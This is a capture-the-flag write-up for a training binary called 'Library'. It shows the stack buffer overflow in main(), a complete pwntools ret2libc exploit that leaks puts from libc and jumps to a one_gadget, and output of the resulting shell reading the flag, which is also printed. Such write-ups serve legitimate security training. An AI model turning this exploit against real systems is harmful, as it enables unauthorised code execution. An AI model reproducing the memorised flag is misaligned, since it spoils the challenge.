# Library :book:

## Description: 

* Agents have the privilege to access our secret library and search whatever they need to for their missions and training. Pay a visit.

## Objective: 

* Take advantage of *Bof* and use `ret2libc` technique.

## Flag: :black_flag:
* HTB{l1br4r13s_4r3_r34lly_h3lpful}

### Difficulty:
* Very Easy

## Challenge:

The interface looks like this:

```console
$ ./library 
Salute Agent! Are you here to look at the book?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Take as much time as you want.
Segmentation fault (core dumped)
```

As we can see, there is a `SegFault` after some "A"s. That means there is a possible *BufferOverflow*.

We run a `checksec` to verify this:
```console
$ checksec ./library
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
**Canary** is disabled and so is **PIE**. This means we probably have code redirect and calls to other functions of the program. 

Let's open a disassembler to analyze the program.

### Disassembly :pick:

We start from `main()`:

```c
undefined8 main(void)

{
  undefined local_28 [32];
  
  setup();
  printf("Salute Agent! Are you here to look at the book?\n> ");
  read(0,local_28,0x60);
  puts("Take as much time as you want.");
  return 0;
}
```

We see that there is a *BufferOverflow* because `local_28` is 32 bytes long and `read()` reads up to 0x60 bytes.

What we need to do is:

* Overflow the buffer with junk
* Leak a `libc address` e.g. `puts()`.
* Call `main()` again to execute another Bof.
* Call `system("/bin/sh")`.

In order to leak the address we need to craft a payload like this:

```python
payload = junk + pop_rdi + puts_got + puts_plt + main_addr
```

### Exploit :scroll:

```python
#!/usr/bin/python3
from pwn import *

ip = '172.17.0.1' # change this
port = 1337 # change this
fname = './library' # change this

LOCAL = False

if LOCAL:
	r = process(fname)
	_libc = '/lib/x86_64-linux-gnu/libc.so.6'
else:
	r = remote(ip, port)
	_libc = './libc.so.6' # change this

libc = ELF(_libc)
e = ELF(fname)
rop = ROP(e)

rl = lambda : r.recvline()
ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)

def libc_leak(junk):
	payload = junk
	payload += p64(rop.find_gadget(['pop rdi'])[0])
	payload += p64(e.got['puts'])
	payload += p64(e.plt['puts'])
	payload += p64(e.symbols['main'])
	sla('>', payload)
	rl()
	return u64(rl()[:-1].ljust(8, b'\x00'))

def get_shell(junk, base):
	og = [0x4f3d5, 0x4f432, 0x10a41c]
	payload = junk
	payload += p64(base + og[0])
	sla('>', payload)
	inter() 

def pwn():
	junk = b'A'*40
	leaked = libc_leak(junk)
	base = leaked - libc.symbols['puts']
	log.info('Leaked:    0x{:x}'.format(leaked))
	log.info('Libc base: 0x{:x}'.format(base))
	get_shell(junk, base)

if __name__ == '__main__':
	pwn()
```

### PoC: :checkered_flag:

```console
$ ./solver.py 
[+] Opening connection to 172.17.0.1 on port 1337: Done
[*] 'challenge/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 'challenge/library'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './library'
[*] Leaked:    0x7fd1e14cfaa0
[*] Libc base: 0x7fd1e144f000
[*] Switching to interactive mode
 Take as much time as you want.
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
HTB{l1br4r13s_4r3_r34lly_h3lpful}
```
